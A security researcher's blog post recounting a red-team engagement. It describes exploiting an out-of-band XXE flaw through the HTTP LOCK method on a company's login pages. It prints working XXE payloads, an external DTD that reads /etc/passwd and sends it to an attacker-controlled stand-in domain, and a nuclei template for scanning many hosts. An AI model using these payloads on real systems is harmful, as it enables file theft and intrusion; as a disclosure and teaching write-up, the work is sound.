Hi Everyone 

In this blog ,i will cover one of the intresting vulnerability **Out-Of-Band XXE via HTTP LOCK Method** that i found during the Red Teaming Engagement in a `Product Based Company` and exploited the vulnerability at a **Large Scale**.

Kudos to all my members [Herane Malhotra](https://www.linkedin.com/in/herane-malhotra007/), [Lokendra Singh Rawat](https://www.linkedin.com/in/lokendrasinghrawat/), [Prashant Kumar](https://linkedin.com/in/notsoshant) who worked along during the assessment.

**How it all started ?**

  Under the Red Teaming Activty there are many category such as Cyber Threat Intelligence, Internal Adversary Simulation, External Adversary Simulation, Social Engineering,Deep Web / Dark Web Exposure, OSINT, Phising etc,.

  This vulnerability was found during the  **External Adversary Simulation** Category, where we used to test for Web Application and Network Assets to find **Critical Server Side** bugs so that we can exfiltrate data to get an inital foothold.
  
**Let's Dive Deep into it!**

* There were hundreds of login pages under the web application pentesting part and credentials that was obtained from Deep / Dark Web Exposure were not working :(

</p>

* Found many login pages which was developed by the company to their customers to handle the data between both the parties.

**Step 1:** Intercept the login request using client side proxy like Burp Suite as shown below.

</p>

**Step 2:** Started to check for HTTP Methods enabled in the application by using **OPTIONS**

<p align="center">

</p>

From the above image , it can be observed that there is no reaction from the application , got the same response we see from **GET** method.

</p>

**Step 3:** When i removed `login.jsp` and supplied a notexisting value (test) it showed up the different HTTP Methods that are allowed in the application.

</p>

Note : The allowed methods are OPTIONS, MKCOL, PUT, LOCK.

</p>

**Step 4:** Tried **PUT** method and it returned `403 forbidden error`, but when i tried **LOCK** method it showed up some **XML** data as output as shown below.

</p>

**Step 5:** Started to test for different kinds of XXE , ended up with OOB-XXE with basic payload as shown below.

```xml
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://youripaddress.com"> %xxe; ]>
```

<p align="center">
  <img src="/images/xxe/xxe7.png">
</p>

Note: We got both the **HTTP** and **DNS** hit from the server.

**Step 6:** Since it is an `Out-Of-Band XXE` , follow the below steps to set-up the environment.

**Note :** We need to host the DTD file on a web server. Here, we used a simple web server on the cloud and pointed the domain `yourdomainname.com` to the serverâ€™s public IP address and hosted the file `exploited.dtd` on the server.

Contents of `exploited.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
```

The request body send to the vulnerable URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd">
%xxe;
%ext;
]>
<foo><u>
&exfil;
</u></foo>
```

<p align="center">

</p>

**Step 7:** Now the fun begins , we were able to exfiltrate and read different directory files and sensitive information such as **backup file, configuration file, ssh keys and access logs** etc,.

* Since there is a huge number of subdomains , we wrote a nuclei template to detect this **OOB-XXE** as shown below.

```yaml
id: XXE on XXXX Login

  name: XML External Entity-XXXX
  author: dhiyaneshDk
  severity: high

  - raw: 
      - |

        <?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd">
        %xxe;
        %ext;
        ]>
        <foo><u>
        &exfil
        </u></foo>

    matchers-condition: and
    matchers:
      - type: status
        status:

      - type: word
        words:

        part: body
```

* There were around **36+ Instance** which was **Vulnerable** to XXE and cross checked all the instance manually.

**Impact :** 

The XXE flaw can allow an attacker to turn the XML parser into a proxy which allows local and remote content to be served on request. It allows an attacker to:
* Read files on the application server
* Interact with any back-end or external systems that the application itself can access
* View configuration files present in the system.
